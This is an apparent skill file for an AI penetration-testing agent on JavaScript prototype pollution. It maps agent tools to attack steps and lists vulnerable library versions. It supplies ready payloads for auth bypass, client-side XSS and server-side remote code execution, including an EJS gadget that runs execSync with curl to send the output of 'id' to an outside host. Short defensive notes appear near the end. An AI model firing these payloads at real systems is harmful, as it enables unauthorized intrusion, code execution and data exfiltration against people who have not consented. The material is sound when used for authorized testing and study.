---
name: Prototype Pollution
description: Reference for client-side and server-side Node.js prototype pollution covering merge-function gadgets, gadget chains to RCE, and CVE landscape (Lodash, jQuery, mongoose, Express).
---

# Prototype Pollution

Reference for finding and exploiting JavaScript prototype pollution in browser and Node.js applications. Pull this in when you fingerprint a JS-heavy stack and find inputs that flow into `Object.assign`, recursive merge / extend / clone functions, query-string parsers, or JSON deserializers.

> Black-box scope: probes drive HTTP and observe response-body / DOM differentials. Server-side gadgets often need a deterministic differential (header echo, cookie set, response-shape change) to confirm pollution actually mutated `Object.prototype`.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| HTTP probes / poisoned bodies | `execute_curl` | JSON body with `__proto__` / `constructor.prototype`. |
| Browser-based gadget testing | `execute_playwright` | Inject pollution via URL hash, observe DOM mutation. |
| Node.js gadget testing locally | `execute_code` (language: bash) -> `node -e '...'` | Try a gadget chain on a downloaded library copy. |
| Decode bundled libraries | `kali_shell` | `grep -hE 'lodash|jquery|merge|extend|deepmerge'` over JS bundle. |

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, the server-side pollute-then-observe loop maps onto two calls: redamon.replay POSTs the pollution body (`{"__proto__":{"polluted":"yes"}}`) to a captured JSON endpoint, then redamon.get or redamon.grep on a later, unrelated JSON response confirms the property leaked onto every object globally; redamon.diff can compare a pre-pollution and post-pollution response of the same route. For a **client-side** gadget (pollution via URL/hash that a browser gadget turns into XSS), stay inside proxy_brain with redamon.browser: `b = redamon.browser(txn_id); b.goto("/app?__proto__[onerror]=alert(1)&x=<img src=x>"); b.alerts()` — a fired dialog confirms the gadget executed, host-pinned and re-captured (read `redamon.manual("browser")`). Where the proxy stops: bundle/library fingerprinting and Node RCE gadget chains stay non-proxy, and redamon.fuzz does not fit here since it iterates a single query param, not a nested JSON body.

## Anatomy

In JavaScript, every object has a hidden link `__proto__` pointing at its constructor's prototype. Polluting `Object.prototype` (the root) means **every** object in the runtime gains the polluted property.

```js
let o = {};
Object.prototype.foo = "bar";
o.foo;            // "bar"
({}).foo;         // "bar"
({a:1}).foo;      // "bar"
```

Triggers (vulnerable patterns):

```js
function merge(target, src) {
  for (let k in src) {
    if (typeof src[k] === 'object') merge(target[k], src[k]);
    else target[k] = src[k];
  }
}
// merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
// -> ({}).isAdmin === true on every subsequent object
```

`__proto__`, `constructor.prototype`, and `prototype` are the three injection keys.

## Reconnaissance

### Library fingerprint

| Library | Vulnerable versions | Gadget |
|---|---|---|
| `lodash` `< 4.17.5` | `_.merge`, `_.defaultsDeep`, `_.set` | CVE-2018-3721, CVE-2019-10744, CVE-2020-8203 |
| `lodash` `< 4.17.20` | More gadgets | CVE-2020-28500 |
| `jQuery` `< 3.4.0` | `$.extend(true, ...)` | CVE-2019-11358 |
| `Hoek` `< 4.2.1` (joi/hapi) | `Hoek.merge` | CVE-2018-3728 |
| `mongoose` (multiple CVEs over time) | Query-operator injection (`$where`, `$ne`, `$regex` from raw body) | Check the CVE feed for the deployed version |
| `mixin-deep` `< 1.3.2` | `mixin-deep` | CVE-2019-10746 |
| `set-value` `< 2.0.1` | `set-value` | CVE-2019-10747 |
| `deepmerge` (multiple CVEs over time) | Recursive merge | Check the CVE feed for the deployed version |
| `dot-prop` `< 4.2.1` | `set` | CVE-2020-8116 |
| `qs` `< 6.5.3` | Query parser | CVE-2014-7191 etc. |
| `extend` `< 3.0.2` | `extend(true, ...)` | CVE-2018-16492 |

Identify via the bundle:

```
kali_shell: curl -s https://target.tld/static/js/main.*.js | grep -oE '"version":"[0-9]+\.[0-9]+\.[0-9]+"' | head
kali_shell: curl -s https://target.tld/static/js/vendor.*.js | grep -oE 'lodash@[0-9.]+|jquery@[0-9.]+'
```

### Find input sinks

| Input | Sink that calls merge / set |
|---|---|
| JSON request body | `Object.assign(state, body)`, `_.merge(config, body)` |
| Query string | `qs.parse(req.url)` -> deep-merged into config |
| URL hash | Client-side parsers feeding state stores |
| Cookies | Custom cookie parsers |
| Form fields | `serialize` libs that build objects from `name="a[b][c]"` |

## Probe matrix

### Server-side detection

```
execute_curl url: "https://target.tld/api/preferences" method: "POST" headers: "Content-Type: application/json" data: '{"__proto__":{"polluted":"yes"}}'
# Then probe a different endpoint expected to return JSON:
execute_curl url: "https://target.tld/api/me"
# If the response includes "polluted":"yes" anywhere, Object.prototype was mutated globally.
```

Common confirmation gadgets:

```json
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"toString":"polluted"}}
{"constructor":{"prototype":{"polluted":1}}}
{"a":{"__proto__":{"polluted":1}}}
{"a":{"b":{"__proto__":{"polluted":1}}}}
```

The bracket-notation form (relevant when JSON is built from form fields):

```
a[__proto__][polluted]=1
a[constructor][prototype][polluted]=1
```

### Server-side gadget -> RCE (Express + child_process)

When the polluted prototype reaches `child_process.spawn` / `exec` options, attackers can inject `shell` or `env`:

```json
{"__proto__":{"shell":"/bin/sh","argv0":"/bin/sh","env":{"NODE_OPTIONS":"--require=/tmp/x.js"}}}
```

Some Node releases honor `NODE_OPTIONS=--require=<path>` if env is polluted, causing every `child_process.spawn` to load the attacker's JS.

### Server-side gadget -> Express response control

```json
{"__proto__":{"status":403,"headers":{"X-Pwn":"1"}}}
```

Polluting `Object.prototype.status` can force every Express `res.json()` call to return a non-200 status.

### Server-side gadget -> EJS / Handlebars RCE

Some templating libraries respect prototype properties when looking up template options:

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('curl http://oast.fun/?$(id)')//"}}
```

Library-specific: research the gadget chain per template engine version.

### Client-side detection

```
execute_playwright url: "https://target.tld/?__proto__[polluted]=yes" script: |
  page.goto("https://target.tld/?__proto__[polluted]=yes")
  print(page.evaluate("() => ({}).polluted"))
  # If output is "yes", Object.prototype was polluted client-side.
```

URL-hash variants (often used by SPAs):

```
https://target.tld/#__proto__[polluted]=yes
https://target.tld/#constructor[prototype][polluted]=yes
https://target.tld/#__proto__[__proto__][polluted]=yes        # double-deep
```

### Client-side gadget -> XSS

Many SPAs walk an options object before rendering. Polluting common option keys triggers DOM XSS:

| Polluted key | Triggers |
|---|---|
| `srcdoc` | `<iframe srcdoc=...>` injection on any iframe |
| `innerHTML` | `el.innerHTML = ...` defaulting to polluted value |
| `template` | Template engines reading `Object.prototype.template` |
| `onerror`, `onload`, `onclick` | Event-handler defaulting |
| `data-script` | Library-specific |

Example client-side XSS probe:

```
https://target.tld/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

If any element renders the `<img>` (because the framework's helper reads `el.innerHTML ?? Object.prototype.innerHTML`), pollution-driven XSS is alive.

## Tooling status

The brief lists `ppfuzz` and `ppmap` as missing. The agent runs equivalent tests via:

- `execute_code` with Node.js: ad-hoc gadget testing on a downloaded library.
- `execute_playwright` for client-side DOM observation.
- `execute_curl` for server-side payload delivery.

Sample manual gadget script:

```
execute_code language: bash
node -e '
const _ = require("lodash");
const o = {};
_.merge(o, JSON.parse(`{"__proto__":{"polluted":42}}`));
console.log(({}).polluted);            // 42 -> vulnerable
console.log(JSON.stringify(_));
'
```

## Validation shape

A clean prototype-pollution finding includes:

1. The exact request body / URL fragment that triggers pollution.
2. Confirmation request showing a **different** object inheriting the polluted property.
3. Library fingerprint (name + version) inferred from the bundle, plus the matching CVE if applicable.
4. Where chained: the gadget that converts pollution into XSS / RCE / privilege escalation, with PoC.
5. Browser screenshot or response-header capture proving the chained impact.

## False positives

- Endpoint accepts the payload but `Object.prototype` is frozen (`Object.freeze(Object.prototype)`).
- Server-side library is patched (`lodash >= 4.17.21`, `jQuery >= 3.5.0`, etc.); payload is echoed but no actual mutation occurs.
- Reflected-but-not-stored: the pollution applies only to the request-scoped object and does not persist to the global `Object.prototype`.
- Client-side framework explicitly clones objects with `Object.create(null)` (no `__proto__` link).

## Hand-off

```
Pollution -> client-side XSS         -> built-in xss skill
Pollution -> server-side RCE         -> built-in cve_exploit / RCE community skill
Pollution -> auth bypass (isAdmin)    -> file as Privilege Escalation
Library version mismatch              -> /skill information_disclosure (bundle fingerprint)
```

## Pro tips

- `__proto__` is the lowest-risk probe key but can be filtered. `constructor.prototype` is the harder-to-filter equivalent.
- `Object.create(null)` produces an object without `__proto__` and is the canonical defense; any framework using it for option bags is immune.
- Frozen `Object.prototype` (`Object.freeze(Object.prototype)`) blocks server-side pollution at the runtime level; very few apps enable it because library compatibility breaks.
- Server-side hits often need 2+ requests: one to pollute, one to observe. Single-request stateless apps may not retain pollution.
- Client-side hits are observable in the same page-load via `({}).<key>` evaluation in the dev console (or `page.evaluate()` from Playwright).
- Always pair pollution with a gadget. Pollution alone is interesting; pollution + RCE is the ship-blocker.
